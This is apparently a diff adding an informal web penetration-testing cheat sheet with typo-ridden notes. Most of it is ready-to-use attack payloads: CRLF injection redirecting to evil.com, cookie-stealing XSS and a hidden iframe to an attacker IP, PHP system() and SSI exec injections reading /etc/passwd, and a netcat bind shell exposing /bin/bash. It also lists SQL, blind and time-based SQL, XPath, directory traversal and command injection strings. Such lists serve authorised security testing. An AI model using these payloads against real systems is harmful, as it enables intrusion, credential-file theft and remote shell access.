@@ -1,0 +1,116 @@
+https://www.cert-in.org.in/PDF/Empanel_org.pdf
+
+CRLF-
+%0d%0aLocation:%20http://www.evil.com
+
+Html injection(Ref):Action in browser
+In burp as well as browser showing unercrypted data and sometime popup
+<h1>abc</h1>
+<script>alert(document.cookie)</script>
+
+Html url redirection:
+we can change host ip address and give some address in string or anythg and check wheather it is workg
+ip add
+hostname
+
+Html stored inje:
+<iframe SRC="http://attackerIP/blah" height="0" width="0"></iframe>
+<h1>abc</h1>
+<script>alert(document.cookie)</script>
+  
+iframe injection:
+<iframe src="http://www.target.site" width="500" height="500"></iframe>
+if it comes with popup in browser
+
+OS command injection:
+
+
+
+PHP code injection: server name and code
+php?message=1; phpinfo()
+message=1; phpinfo()
+i.php?message=""; system('hostname')
+
+
+Server side Includes(SSI):
+<!--#exec cmd="id" -->   username
+<!--#exec cmd="cat /etc/passwd" -->  pass
+
+Kali linux
+connect to me on port 8888!
+<!--#exec cmd="nc -lvp 8888 -e /bin/bash" -->
+
+Sql injection:
+'or'1=1
+''
+iron' or 1=1#
+iron' or 1=2#
+Stored Sql:
+test','test')#
+canary1','canary2')#
+
+Blind Sql
+' WAITFOR TIME'11:07:59 AM'
+test'or1=1#
+test'-SLEEP(5)#
+and 1=1
+and 1=2
+Time based	
+(select*from(select(sleep(20)))T)
+sleep(5), wait for delay(
+test'-IF(MID(VERSION(),1,1) = '5', SLEEP(5), 0)#
+
+Stored Sql
+test','test')#
+canary1','canary2')#
+canary1',(select version()))#
+canary1',(select user()))#
+
+Xpath inj
+same as sql injection. if we special comme and end of url and it shows some XML error then it is xpath
+whatever' or 1=1 or '
+
+
+NTLM
+1. Check Response WWW-Authenticate: NTLM 
+2. There will be Value ->base64 Decode
+3. You will get NTLMSSP
+4. Check the Numbers 0,8,3 ->
+5. 8 = ntlmv2
+
+Broken Auth
+
+Html web storage
+
+
+
+Directory transverrsal
+.php?dir=documents
+.php?page=../../../../../etc/password
+
+	
+
+
+
+
+
+*****Server Banner Disc*
+&&%20cat%20/etc/passwd%20
+1.aspx
+100.exe/jar
+
+
+*****Pred Res Loc****
+/server_status/
+
+***HTTP VerbTampering/Arbit***
+Method= Indusface
+
+
+<script>alert("xss")</script>;{{7*7}}'"\
+
+
+"><A>aaa</A>
+
+
+
